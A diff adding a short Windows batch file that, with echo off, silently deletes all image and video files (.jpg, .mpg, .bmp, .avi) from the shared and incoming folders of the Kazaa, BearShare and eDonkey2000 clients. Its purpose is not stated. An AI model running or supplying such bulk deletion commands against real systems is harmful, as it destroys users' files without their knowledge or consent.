@@ -1,0 +1,16 @@
+@Echo Off
+@cd C:\Program Files\Kazaa\My Shared Folder\
+@del *.jpg
+@del *.mpg
+@del *.bmp
+@del *.avi
+@cd c:\program files\bearshare\shared\
+@del *.jpg
+@del *.mpg
+@del *.bmp
+@del *.avi
+@cd c:\program files\eDonkey2000\incoming\
+@del *.jpg
+@del *.mpg
+@del *.bmp
+@del *.avi
